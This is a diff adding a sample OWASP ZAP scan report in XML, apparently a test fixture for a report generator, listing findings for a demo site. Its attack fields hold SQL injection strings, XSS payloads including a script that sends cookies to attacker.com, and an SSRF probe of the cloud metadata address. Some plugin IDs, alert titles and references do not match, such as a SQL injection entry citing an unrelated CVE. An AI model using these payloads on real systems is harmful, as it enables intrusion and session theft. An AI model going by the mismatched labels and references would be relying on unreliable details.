@@ -1,0 +1,362 @@
+<?xml version="1.0"?>
+<!--
+  sample_scan.xml: Reporte de ejemplo realista generado por OWASP ZAP 2.14.0
+  Uso: python generate_report.py -i sample_scan.xml -c "Empresa Demo S.A." -u "https://demo.empresa.com"
+-->
+<OWASPZAPReport version="2.14.0" generated="Mon, 02 Jun 2026 10:30:00">
+  <site host="demo.empresa.com" port="443" sslEnabled="true" name="https://demo.empresa.com">
+    <alerts>
+
+      <!-- ══════════════════════════════════════
+           HIGH SEVERITY
+      ══════════════════════════════════════ -->
+
+      <alertitem>
+        <pluginid>40018</pluginid>
+        <alert>SQL Injection</alert>
+        <name>SQL Injection</name>
+        <riskcode>3</riskcode>
+        <confidence>3</confidence>
+        <riskdesc>High (High)</riskdesc>
+        <desc>SQL injection may be possible. The page results were manipulated using the boolean conditions [ZAP AND 1=1 --] and [ZAP AND 1=2 --] The parameter value being modified was NOT stripped from the HTML output for the purposes of the comparison. Data was returned for the original parameter. The vulnerability was detected by successfully manipulating the parameter to cause the server to return a different response depending on the SQL query results.</desc>
+        <instances>
+          <instance>
+            <uri>https://demo.empresa.com/login</uri>
+            <method>POST</method>
+            <param>username</param>
+            <attack>' OR '1'='1</attack>
+            <evidence>Welcome back, admin</evidence>
+          </instance>
+          <instance>
+            <uri>https://demo.empresa.com/api/users/search</uri>
+            <method>GET</method>
+            <param>q</param>
+            <attack>1' AND 1=2--</attack>
+            <evidence>0 results found</evidence>
+          </instance>
+        </instances>
+        <count>2</count>
+        <solution>Do not trust client-side input, even if there is client-side validation in place. In general, type check all data on the server side. If the application uses JDBC, use PreparedStatement or CallableStatement, with parameters passed by '?' Use parameterized stored procedures. This will ensure that all user input is treated as data rather than potentially being interpreted as SQL commands.</solution>
+        <otherinfo>The query database is MySQL. The parameter [username] is vulnerable to SQL injection. DBMS error message: You have an error in your SQL syntax.</otherinfo>
+        <reference>https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+https://www.owasp.org/index.php/Top_10_2013-A1-Injection
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228</reference>
+        <cweid>89</cweid>
+        <wascid>19</wascid>
+      </alertitem>
+
+      <alertitem>
+        <pluginid>40012</pluginid>
+        <alert>Cross Site Scripting (Reflected)</alert>
+        <name>Cross Site Scripting (Reflected)</name>
+        <riskcode>3</riskcode>
+        <confidence>3</confidence>
+        <riskdesc>High (High)</riskdesc>
+        <desc>Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.</desc>
+        <instances>
+          <instance>
+            <uri>https://demo.empresa.com/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E</uri>
+            <method>GET</method>
+            <param>q</param>
+            <attack>&lt;script&gt;alert(1)&lt;/script&gt;</attack>
+            <evidence>&lt;div class="results"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;</evidence>
+          </instance>
+          <instance>
+            <uri>https://demo.empresa.com/profile/edit</uri>
+            <method>POST</method>
+            <param>displayName</param>
+            <attack>"&gt;&lt;img src=x onerror=alert(document.domain)&gt;</attack>
+            <evidence>"&gt;&lt;img src=x onerror=alert(document.domain)&gt;</evidence>
+          </instance>
+          <instance>
+            <uri>https://demo.empresa.com/comment?post=15&amp;text=%3Cscript%3E</uri>
+            <method>GET</method>
+            <param>text</param>
+            <attack>&lt;script&gt;document.location='https://attacker.com/steal?c='+document.cookie&lt;/script&gt;</attack>
+            <evidence>Reflected in response body without encoding</evidence>
+          </instance>
+        </instances>
+        <count>3</count>
+        <solution>Phase: Architecture and Design — Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket. For every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the browser may choose a different encoding by guessing which encoding is actually being used by the web page. This can cause the browser to treat certain sequences as special, opening up the client to subtle XSS attacks.</solution>
+        <reference>https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+https://owasp.org/www-community/attacks/xss/
+https://cwe.mitre.org/data/definitions/79.html</reference>
+        <cweid>79</cweid>
+        <wascid>8</wascid>
+      </alertitem>
+
+      <alertitem>
+        <pluginid>90034</pluginid>
+        <alert>Server Side Request Forgery</alert>
+        <name>Server Side Request Forgery</name>
+        <riskcode>3</riskcode>
+        <confidence>2</confidence>
+        <riskdesc>High (Medium)</riskdesc>
+        <desc>The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination. By providing URLs to unexpected hosts or ports, attackers can make it appear that the server is sending the request, possibly bypassing access controls such as firewalls that prevent the attackers from accessing the URLs directly.</desc>
+        <instances>
+          <instance>
+            <uri>https://demo.empresa.com/api/fetch-preview</uri>
+            <method>POST</method>
+            <param>url</param>
+            <attack>http://169.254.169.254/latest/meta-data/</attack>
+            <evidence>ami-id: ami-0abcdef1234567890</evidence>
+          </instance>
+        </instances>
+        <count>1</count>
+        <solution>Sanitize and validate all client-supplied input data. Establish an allow list for protocols, domains, ports and URLs that the application requires. Block requests to private IP ranges (RFC 1918) and loopback addresses. Use a web application firewall (WAF) to detect and block SSRF patterns.</solution>
+        <reference>https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</reference>
+        <cweid>918</cweid>
+        <wascid>10</wascid>
+      </alertitem>
+
+      <!-- ══════════════════════════════════════
+           MEDIUM SEVERITY
+      ══════════════════════════════════════ -->
+
+      <alertitem>
+        <pluginid>20012</pluginid>
+        <alert>Anti-CSRF Tokens Check</alert>
+        <name>Absence of Anti-CSRF Tokens</name>
+        <riskcode>2</riskcode>
+        <confidence>2</confidence>
+        <riskdesc>Medium (Medium)</riskdesc>
+        <desc>No Anti-CSRF tokens were found in a HTML submission form. A cross-site request forgery is an attack that involves forcing a victim to send an HTTP request to a target destination without their knowledge or intent in order to perform an action as the victim. The underlying cause is application functionality using predictable URL/form actions in a repeatable way.</desc>
+        <instances>
+          <instance>
+            <uri>https://demo.empresa.com/account/password-change</uri>
+            <method>POST</method>
+            <param>password</param>
+            <attack></attack>
+            <evidence>&lt;form method="POST" action="/account/password-change"&gt;</evidence>
+          </instance>
+          <instance>
+            <uri>https://demo.empresa.com/account/email-change</uri>
+            <method>POST</method>
+            <param>email</param>
+            <attack></attack>
+            <evidence>&lt;form method="POST" action="/account/email-change"&gt;</evidence>
+          </instance>
+        </instances>
+        <count>2</count>
+        <solution>Phase: Architecture and Design — Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, use anti-CSRF packages such as the OWASP CSRFGuard. Generate a unique nonce for each form, add the nonce to the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable.</solution>
+        <reference>https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+https://cwe.mitre.org/data/definitions/352.html</reference>
+        <cweid>352</cweid>
+        <wascid>9</wascid>
+      </alertitem>
+
+      <alertitem>
+        <pluginid>10038</pluginid>
+        <alert>Content Security Policy (CSP) Header Not Set</alert>
+        <name>Content Security Policy (CSP) Header Not Set</name>
+        <riskcode>2</riskcode>
+        <confidence>3</confidence>
+        <riskdesc>Medium (High)</riskdesc>
+        <desc>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page.</desc>
+        <instances>
+          <instance>
+            <uri>https://demo.empresa.com/</uri>
+            <method>GET</method>
+            <param></param>
+            <attack></attack>
+            <evidence>Content-Security-Policy header is missing</evidence>
+          </instance>
+          <instance>
+            <uri>https://demo.empresa.com/login</uri>
+            <method>GET</method>
+            <param></param>
+            <attack></attack>
+            <evidence>Content-Security-Policy header is missing</evidence>
+          </instance>
+        </instances>
+        <count>2</count>
+        <solution>Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header. Configure a strict CSP policy that includes: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; frame-ancestors 'none'.</solution>
+        <reference>https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html</reference>
+        <cweid>693</cweid>
+        <wascid>15</wascid>
+      </alertitem>
+
+      <alertitem>
+        <pluginid>40014</pluginid>
+        <alert>Cross Site Request Forgery in form</alert>
+        <name>Insecure Direct Object Reference (IDOR)</name>
+        <riskcode>2</riskcode>
+        <confidence>2</confidence>
+        <riskdesc>Medium (Medium)</riskdesc>
+        <desc>An Insecure Direct Object Reference occurs when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files. The application uses a predictable numeric identifier to access user profile data, allowing enumeration of other users' information.</desc>
+        <instances>
+          <instance>
+            <uri>https://demo.empresa.com/api/users/1042/profile</uri>
+            <method>GET</method>
+            <param>userId</param>
+            <attack>1043</attack>
+            <evidence>{"id":1043,"email":"otro.usuario@empresa.com","nombre":"Otro Usuario"}</evidence>
+          </instance>
+          <instance>
+            <uri>https://demo.empresa.com/api/invoices/download?id=5518</uri>
+            <method>GET</method>
+            <param>id</param>
+            <attack>5517</attack>
+            <evidence>Factura_5517_ClienteDiferente.pdf returned successfully</evidence>
+          </instance>
+        </instances>
+        <count>2</count>
+        <solution>Implement proper access control checks on all object references. Use indirect object references by mapping user-specific identifiers to actual database IDs. Validate that the authenticated user is authorized to access the requested object. Consider using UUID instead of sequential integer IDs.</solution>
+        <reference>https://owasp.org/www-chapter-ghana/assets/slides/IDOR.pdf
+https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html</reference>
+        <cweid>284</cweid>
+        <wascid>2</wascid>
+      </alertitem>
+
+      <alertitem>
+        <pluginid>10032</pluginid>
+        <alert>Viewstate without MAC Signature</alert>
+        <name>Session Token Exposed in URL</name>
+        <riskcode>2</riskcode>
+        <confidence>2</confidence>
+        <riskdesc>Medium (Medium)</riskdesc>
+        <desc>A session token was found in the URL. This can be exploited by an attacker who obtains the URL from browser history, web server logs, referer headers, or other sources. Exposing session tokens in URLs increases the risk of session hijacking attacks.</desc>
+        <instances>
+          <instance>
+            <uri>https://demo.empresa.com/dashboard?sessionid=abc123def456ghi789</uri>
+            <method>GET</method>
+            <param>sessionid</param>
+            <attack></attack>
+            <evidence>sessionid=abc123def456ghi789</evidence>
+          </instance>
+        </instances>
+        <count>1</count>
+        <solution>Store session identifiers in cookies with the Secure and HttpOnly flags enabled. Remove session identifiers from all URLs. Use POST requests instead of GET for sensitive operations. Implement proper session management that uses server-side session storage.</solution>
+        <reference>https://owasp.org/www-community/vulnerabilities/Session_ID_in_URL
+https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html</reference>
+        <cweid>598</cweid>
+        <wascid>9</wascid>
+      </alertitem>
+
+      <!-- ══════════════════════════════════════
+           LOW SEVERITY
+      ══════════════════════════════════════ -->
+
+      <alertitem>
+        <pluginid>10036</pluginid>
+        <alert>Server Leaks Version Information via "Server" HTTP Response Header Field</alert>
+        <name>Server Leaks Version Information via HTTP Header</name>
+        <riskcode>1</riskcode>
+        <confidence>3</confidence>
+        <riskdesc>Low (High)</riskdesc>
+        <desc>The web/application server is leaking version information via the "Server" HTTP response header. Access to such information may facilitate attackers identifying other vulnerabilities your web/application server is subject to. Knowing the specific version of a server component can help attackers find and exploit known vulnerabilities for that particular version.</desc>
+        <instances>
+          <instance>
+            <uri>https://demo.empresa.com/</uri>
+            <method>GET</method>
+            <param></param>
+            <attack></attack>
+            <evidence>Server: Apache/2.4.41 (Ubuntu) OpenSSL/1.1.1f</evidence>
+          </instance>
+        </instances>
+        <count>1</count>
+        <solution>Configure the web server to suppress the "Server" HTTP response header, or replace it with a generic value that does not reveal version information. In Apache, use the ServerTokens directive set to "Prod" or "Min".</solution>
+        <reference>https://httpd.apache.org/docs/current/mod/core.html#servertokens
+https://owasp.org/www-project-web-security-testing-guide/</reference>
+        <cweid>200</cweid>
+        <wascid>13</wascid>
+      </alertitem>
+
+      <alertitem>
+        <pluginid>10011</pluginid>
+        <alert>Cookie Without Secure Flag</alert>
+        <name>Cookie Without Secure Flag</name>
+        <riskcode>1</riskcode>
+        <confidence>2</confidence>
+        <riskdesc>Low (Medium)</riskdesc>
+        <desc>A cookie has been set without the secure flag, which means that the cookie can be accessed via unencrypted connections. The following cookies do not have the secure flag set: session_prefs, analytics_id.</desc>
+        <instances>
+          <instance>
+            <uri>https://demo.empresa.com/login</uri>
+            <method>POST</method>
+            <param>Set-Cookie</param>
+            <attack></attack>
+            <evidence>Set-Cookie: session_prefs=eyJsYW5nIjoiZXMifQ==; Path=/; HttpOnly</evidence>
+          </instance>
+          <instance>
+            <uri>https://demo.empresa.com/</uri>
+            <method>GET</method>
+            <param>Set-Cookie</param>
+            <attack></attack>
+            <evidence>Set-Cookie: analytics_id=ua-12345; Path=/</evidence>
+          </instance>
+        </instances>
+        <count>2</count>
+        <solution>Whenever a cookie contains sensitive information or is a session token, then it should always be passed using an encrypted channel. Ensure that the secure flag is set for cookies containing such sensitive information. Set the Secure flag by appending ";Secure" to the cookie definition.</solution>
+        <reference>https://owasp.org/www-community/controls/SecureCookieAttribute
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#secure_cookies</reference>
+        <cweid>614</cweid>
+        <wascid>13</wascid>
+      </alertitem>
+
+      <!-- ══════════════════════════════════════
+           INFORMATIONAL
+      ══════════════════════════════════════ -->
+
+      <alertitem>
+        <pluginid>10010</pluginid>
+        <alert>Cookie No HttpOnly Flag</alert>
+        <name>Cookie No HttpOnly Flag</name>
+        <riskcode>0</riskcode>
+        <confidence>2</confidence>
+        <riskdesc>Informational (Medium)</riskdesc>
+        <desc>A cookie has been set without the HttpOnly flag, which means that the cookie can be accessed by JavaScript. If a malicious script can be run on this page then the cookie will be accessible and can be transmitted to another site. If this is a session cookie then session hijacking may be possible.</desc>
+        <instances>
+          <instance>
+            <uri>https://demo.empresa.com/</uri>
+            <method>GET</method>
+            <param>Set-Cookie</param>
+            <attack></attack>
+            <evidence>Set-Cookie: _ga=GA1.2.1234567890.1234567890; Path=/</evidence>
+          </instance>
+        </instances>
+        <count>1</count>
+        <solution>Ensure that the HttpOnly flag is set for all cookies. Apply the HttpOnly attribute to cookies that should not need to be accessed by client-side JavaScript. Note: third-party cookies (e.g., Google Analytics) may not always support this flag.</solution>
+        <reference>https://owasp.org/www-community/HttpOnly
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#security</reference>
+        <cweid>1004</cweid>
+        <wascid>13</wascid>
+      </alertitem>
+
+      <alertitem>
+        <pluginid>10020</pluginid>
+        <alert>X-Frame-Options Header Not Set</alert>
+        <name>X-Frame-Options Header Not Set</name>
+        <riskcode>0</riskcode>
+        <confidence>2</confidence>
+        <riskdesc>Informational (Medium)</riskdesc>
+        <desc>X-Frame-Options header is not included in the HTTP response to protect against 'ClickJacking' attacks. The application could be embedded in an iframe on a malicious site, potentially leading to clickjacking attacks.</desc>
+        <instances>
+          <instance>
+            <uri>https://demo.empresa.com/</uri>
+            <method>GET</method>
+            <param></param>
+            <attack></attack>
+            <evidence>X-Frame-Options header is not set</evidence>
+          </instance>
+          <instance>
+            <uri>https://demo.empresa.com/login</uri>
+            <method>GET</method>
+            <param></param>
+            <attack></attack>
+            <evidence>X-Frame-Options header is not set</evidence>
+          </instance>
+        </instances>
+        <count>2</count>
+        <solution>Most modern Web browsers support the X-Frame-Options HTTP header. Ensure it's set on all web pages returned by your site. If you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. Alternatively, implement Content-Security-Policy frame-ancestors directive.</solution>
+        <reference>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+https://owasp.org/www-community/attacks/Clickjacking</reference>
+        <cweid>1021</cweid>
+        <wascid>15</wascid>
+      </alertitem>
+
+    </alerts>
+  </site>
+</OWASPZAPReport>
